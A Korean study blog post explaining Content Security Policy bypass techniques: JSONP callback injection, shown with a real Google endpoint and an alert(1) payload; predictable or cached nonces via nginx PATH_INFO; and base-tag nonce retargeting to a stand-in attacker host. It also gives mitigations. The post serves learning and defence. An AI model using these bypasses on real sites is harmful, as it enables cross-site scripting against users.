---
title: "[2025-08-02] CSP Bypass"
excerpt: "CSP Bypass"

categories:
  - Justice
tags:
  - [CSP]

permalink: /Justice/[2025-08-02] CSP Bypass/

toc: true
toc_sticky: true

date: 2025-08-02
last_modified_at: 2025-08-05
---

## 🦥 본문

## CSP 우회

### 신뢰하는 도메인에 업로드

출처에 스크립트와 같은 자원을 업로드한 뒤 다운로드 경로로 웹 페이지에 자원을 포함

- EX) 공격자가 `/download_file.php?id=177742` 에 자신이 만든 JS 파일을 업로드한 경우에 `self` 정책에 위배되지 않아서 CSP 우회 성공
    
    ```html
     <meta http-equiv="Content-Security-Policy" content="script-src 'self'">
    ...
    <h1>검색 결과: <script src="/download_file.php?id=177742"></script></h1>
    ```
    

### JSONP API

CSP에서 허용한 출처가 JSONP API를 제공하는 경우 callback 파라미터에 스크립트를 삽입하여 공격

- JSONP API : JS 코드처럼 생긴 데이터를 `<script>` 태그를 통해 받아오는 방식. 즉, 서로 다른 도메인 간에 데이터를 주고받을 때 사용하는 기술
    - EX)
        1. 클라이언트에서 showUser 요청
        
        ```html
        <script src="https://api.example.com/user?id=123&callback=showUser"></script>
        ```
        
        1. 서버에서 응답
        
        ```html
        showUser({
          "name": "Alice",
          "age": 25
        });
        ```
        
        1. `showUser()` 함수가 클라이언트에 정의돼 있다면 서버에서 넘긴 데이터 실행
- EX) `*.google.com` 에서 온 출처만 허용한다고 가정. 구글에서 JSONP API를 지원하는 서버를 찾아 `callback`에 원하는 스크립트를 삽입
    
    ```html
    https://accounts.google.com/o/oauth2/revoke?callback=alert(1);
    
    <meta http-equiv="Content-Security-Policy" content="script-src 'https://*.google.com/'">
    ...
    <script src="https://accounts.google.com/o/oauth2/revoke?callback=alert(1);"></script>
    <!-- JSONP API 결과:
    // API callback
    alert(1);({
      "error": {
        "code": 400,
        "message": "Invalid JSONP callback name: 'alert(1)'; only alphabet, number, '_', '$', '.', '[' and ']' are allowed.",
        "status": "INVALID_ARGUMENT"
      }
    }
    );
    -->
    ```
    

### nonce

- 외부 JS 로드
    
    ```html
    <script src= ".."></script>
    ```
    
    - 외부 JS는 정적 파일이라고 전제하여 nonce 검사를 안함
    - `script-src` 만 검사
    - 해당 주소에서 동적으로 응답하는 경우 취약점 발생

- `nonce` 값이 예측 가능한 값인 경우에 공격자가 유추하여 스크립트 삽입 가능.
    - 예측 가능한 알고리즘 X
    - 현재 시각 기반의 `rand()`, `srand()` 등을 사용하면 예측 가능
    - 의사 난수 생성기 CSPRNG 사용 권장
- `nonce` 값을 담고 있는 HTTP 헤더 또는 `<meta>` 태그 **캐싱** 주의
    - PHP, CGI 계열 스크립팅을 사용하는 경우 `/index.php/style.css` 처럼 뒤에 추가적인 경로를 붙여 접근이 가능
    - 확장자 기반으로 캐시 여부를 판단하는 경우 `.css` 는 일반적으로 정적 파일이므로 캐시에 저장 가능.
        - `.css`처럼 보이는 PHP 동적 콘텐츠인 경우가 발생
        - 캐시 만료 전까지 요청마다 같은 `nonce` 가 돌아오므로 `nonce`를 획득 가능 → DOM XSS 가능
    - 동작 흐름
        1. `index.php` 는 동적으로 페이지를 생성하는 서버의 PHP 코드. 응답에 매번 다른 CSP `nonce` 값을 넣어줌
        2. /index.php/style.css 로 URL 변조 : 정적 파일 .css 처럼 보이게 조작. 
            - 뒤에 있는 URL에서 `/index.php`만 보고 `index.php`를 실행.  `/style.css`는 PHP 코드 내부에서 무시되거나 추가 정보로 전달
        3.  요청의 `.css` 확장자를 본 브라우저는 응답 캐싱
        4. 캐싱 만료 전까지는 같은 `nonce` 가 계속 사용 
            - 해당 CSS URL을 요청하면 같은 `nonce` 값을 받음. 이 값을 script에 넣으면 CSP 우회 가능
    - EX) snippet/fastcgi-php.conf 의 일부 중 아래와 같은 설정을 하는 경우
        
        ```html
         # regex to split $uri to $fastcgi_script_name and $fastcgi_path
        fastcgi_split_path_info ^(.+\.php)(/.+)$;
        -> .php 까지만 실행 대상 파일로 인식. 그 뒤는 추가 정보 (path info)로 처리
        -> 즉 PHP 실행 
        
        # Check that the PHP script exists before passing it
        try_files $fastcgi_script_name =404;
        
        # Bypass the fact that try_files resets $fastcgi_path_info
        # see: http://trac.nginx.org/nginx/ticket/321
        set $path_info $fastcgi_path_info;
        fastcgi_param PATH_INFO $path_info;
        
        fastcgi_index index.php;
        include fastcgi.conf;
        ```
        
        - `index.php/style.css` 를 보냈을 때 아래의 응답이 캐싱이 되어 고정된 `nonce` 값 노출
            
            ```html
            <meta http-equiv="Content-Security-Policy" content="script-src 'nonce-ABC123'">
            ```
            
        - 공격자가 다음과 같이 사용 가능
            
            ```html
            <script nonce="ABC123">alert(1);</script> 
            ```
            
    - PATH_INFO 기능을 사용하지 않을 거면 아래와 같이 설정
        - 끝 부분이 `.php` 일 때만 FastCGI로 넘어가게 수정
        - 또한 `a/b.php/c/d.php` 같이 `.php` 중복 사용을 대비하여 `fastcgi-php.conf` 스니펫을 사용하지 않고 아래와 같이 Nginx 설정 변경
            - 스니펫 : 자주 쓰는 설정 내용을 따로 뽑아서 저장해둔 조각
            
            ```html
            location ~ \.php$ {         
                try_files $uri =404;
                fastcgi_index index.php;
                include fastcgi.conf;  -> fastcgi.conf에는 PATH_INFO가 없음
                fastcgi_pass unix:/run/php/php7.2-fpm.sock;
            }
            ```
            
            - `~ \.php$` 를 통해 `.php`로 끝나는 URL만 처리
            - `fastcgi-php.conf` 스니펫이 아닌 `fastcgi.conf` 을 include하여 사용

### base-uri 미지정

`<base>` 태그는 경로가 해석되는 기본 값 변경. 

- Nonce Retargeting : nonce 가 유효한 스크립트를 공격자의 주소로 유도해서 실행시키는 공격
    - EX) 공격자가`<base href="https://malice.test/">` 를 삽입 하는 경우
        
        → 기존의 `src`가 포함된 스크립트는  nonce도 이미 존재하므로 문제 없이 스크립트 로딩이 공격자의 서버로 바뀌어 실행 
        

`base-uri` 지시문을 임의로 지정하지 않는 이상 `default` 초기 값이 존재 하지 않아 `base-uri`를 `none`으로 지정하여 막아야 한다. 

```html
Content-Security-Policy: base-uri 'none'
```